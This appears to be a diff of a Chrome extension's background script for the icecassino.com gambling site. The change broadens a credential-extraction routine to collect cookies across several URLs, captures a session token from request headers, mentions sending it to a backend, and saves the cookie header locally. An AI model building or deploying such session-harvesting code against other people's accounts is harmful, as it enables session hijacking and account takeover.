@@ -2,9 +2,32 @@
 /**
  * Extracts all available storage data from a domain
  */
-async function extractAllCredentials(url, tabId) {
-    const domain = new URL(url).hostname;
-    const cookies = await chrome.cookies.getAll({ domain });
+async function extractAllCredentials(url, tabId, extraUrls = []) {
+  const cookieUrlCandidates = new Set();
+  if (url) {
+    cookieUrlCandidates.add(url);
+  }
+  for (const u of extraUrls) {
+    if (u) {
+      cookieUrlCandidates.add(u);
+    }
+  }
+
+  const cookies = [];
+  const cookieKeySet = new Set();
+  for (const candidate of cookieUrlCandidates) {
+    try {
+      const list = await chrome.cookies.getAll({ url: candidate });
+      for (const c of list) {
+        const key = `${c.name}|${c.domain}|${c.path}`;
+        if (cookieKeySet.has(key)) continue;
+        cookieKeySet.add(key);
+        cookies.push(c);
+      }
+    } catch (e) {
+      // ignore invalid URLs
+    }
+  }
   const targetTabId = tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
 
   if (!targetTabId) {
@@ -92,7 +115,15 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
         console.log('[BACKGROUND] Formato:', /^[0-9a-f]{32}$/i.test(token) ? 'hex 32 ✅' : 'formato inesperado ⚠️');
         
         // Extrair credenciais (NEW - CREDENTIAL EXTRACTION)
-        const credentials = await extractAllCredentials(details.url);
+          const originHeader = details.requestHeaders.find(h => h.name && h.name.toLowerCase() === 'origin');
+          const refererHeader = details.requestHeaders.find(h => h.name && h.name.toLowerCase() === 'referer');
+          const extraUrls = [
+            originHeader?.value,
+            refererHeader?.value,
+            'https://icecassino.com/',
+            'https://www.icecassino.com/'
+          ].filter(Boolean);
+          const credentials = await extractAllCredentials(details.url, undefined, extraUrls);
         console.log('[BACKGROUND] 📦 Credenciais extraídas:', {
           localStorage_keys: Object.keys(credentials.localStorage).length,
           sessionStorage_keys: Object.keys(credentials.sessionStorage).length,
@@ -124,6 +155,21 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
         }).catch(e => {
           console.error('[BACKGROUND] ❌ Erro ao enviar token ao backend:', e);
         });
+
+        // Salvar cookies localmente para uso do content script (fallback)
+        try {
+          if (credentials && credentials.cookies && credentials.cookies.length > 0) {
+            const cookieHeader = credentials.cookies
+              .filter(c => c && c.name && c.value !== undefined)
+              .map(c => `${c.name}=${c.value}`)
+              .join('; ');
+            if (cookieHeader) {
+              chrome.storage.local.set({ casino_cookies: cookieHeader });
+            }
+          }
+        } catch (e) {
+          console.warn('[BACKGROUND] ⚠️ Erro ao salvar cookies no storage:', e);
+        }
         
         // Enviar para content script atualizar UI
         if (details.tabId && details.tabId > 0) {
